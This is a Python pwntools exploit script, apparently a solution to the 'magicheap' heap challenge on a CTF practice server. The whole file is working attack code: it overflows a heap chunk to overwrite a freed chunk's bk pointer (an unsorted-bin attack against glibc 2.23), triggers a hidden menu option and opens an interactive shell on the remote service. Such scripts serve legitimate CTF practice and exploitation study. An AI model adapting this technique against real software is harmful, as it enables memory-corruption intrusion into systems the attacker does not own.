from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn",27492)
# io=process("./magicheap")
libc=ELF("./libc-2.23.so")

def add(s,cc):
    io.sendlineafter(b"Your choice :",b"1")
    io.sendlineafter(b"Size of Heap : ",str(s))
    io.sendafter(b"Content of heap:",cc)
    
def edit(n,s,cc):
    io.sendlineafter(b"Your choice :",b"2")
    io.sendlineafter(b"Index :",str(n))
    io.sendlineafter(b"Size of Heap : ",str(s))
    io.sendafter(b"Content of heap : ",cc)

def delete(n):
    io.sendlineafter(b"Your choice :",b"3")
    io.sendlineafter(b"Index :",str(n))

# gdb.attach(io)
# pause()

add(0x20,b"aaa") #0
add(0x90,b"bbb") #1
add(0x10,b"ccc") #2

delete(1)
fd=0
bk=0x6020A0
edit(0,0x50,cyclic(0x20)+p64(0)+p64(0x91)+p64(fd)+p64(bk-0x10))
add(0x80,b"zzzz")
io.sendlineafter(b"Your choice :",b"4869")

io.interactive()